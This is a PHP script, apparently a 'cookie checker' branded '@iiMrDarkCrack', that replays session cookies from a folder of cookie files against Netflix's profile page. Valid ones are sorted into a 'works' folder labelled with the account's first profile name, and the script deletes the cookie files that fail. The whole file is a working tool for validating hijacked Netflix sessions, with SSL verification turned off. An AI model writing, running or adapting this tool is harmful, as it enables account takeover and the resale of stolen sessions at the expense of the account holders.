<?php 
    class Netflix{
        public $Cookies;
        public $CookiesString;
        public $profileURL;
        public $profileInputs;

        public $htmlPage;

        public $Status;
        public $Users = [];

        function __construct(){
            $this->profileURL = "https://www.netflix.com/browse/";
            $this->profileInputs = "https://www.netflix.com/browse/";
        }

        function GetCookies($cookieFile){
            $cookies = file($cookieFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $headerCookies = [];
            foreach ($cookies as $cookie) {
                $cookieParts = explode("\t", $cookie);
                @$name = $cookieParts[5];
                @$value = $cookieParts[6];
            
                $headerCookies[] = "$name=$value";
            }
            $cookieHeader = implode('; ', $headerCookies);
            $this->CookiesString = $cookieHeader;
        }

        function Login(){
            $headers = array(
                'Content-Type: text/html; charset=utf-8',
                'Cookie: '.$this->CookiesString,
                'Accept: */*',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
                'X-Ua-Compatible: IE=edge',
                'X-Xss-Protection: 1; mode=block; report=https://www.netflix.com/ichnaea/log/freeform/xssreport'
            );

            $ch = curl_init($this->profileURL);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if($httpcode != '200'){
                $this->Status = "False";
                return false;
            }else{
                $this->Status = "True";

                $dom = new DOMDocument();
                @$dom->loadHTML($response);
                $xpath = new DOMXPath($dom);

                $UsersinAccount = array();

                $main_list = $xpath->query('//div[@class="list-profiles"]//ul//li');
                for($i=0;$i < $main_list->length;$i++){

                    $userProfile = @$xpath->query('//div[@class="list-profiles"]//ul//li//div//span[@class="profile-name"]')[$i]->textContent;
                    $UsersinAccount[] = $userProfile;
                }

                $this->Users = $UsersinAccount;
                return true;
            }
        }
    }
    
    $dir = 'cookies/';
    $fullDIR = '';
    $files = scandir($dir);

    if(!is_dir("./cookies/works")){
        mkdir("./cookies/works");
    }

    foreach($files as $row){
        if($row != '..' and $row != '.' and $row != 'works'){
            $Netflix = new Netflix();
            $fullDIR = $dir.$row;
            $Netflix->GetCookies($fullDIR);
            if($Netflix->Login()){
                $hi = json_encode($Netflix->Users);
                $de = json_decode($hi);

                copy($fullDIR, "cookies/works/@iiMrDarkCrack Netflix [".$de[0]."].txt");
                echo "\x1b[32m \x1b[1m Successfully ".$hi." | $fullDIR \n";
                unlink($fullDIR);
            }else{
                echo "\x1b[31m \x1b[1m $row | Failed And Deleted\n";
                unlink($fullDIR);
            }
        }
    }
?>
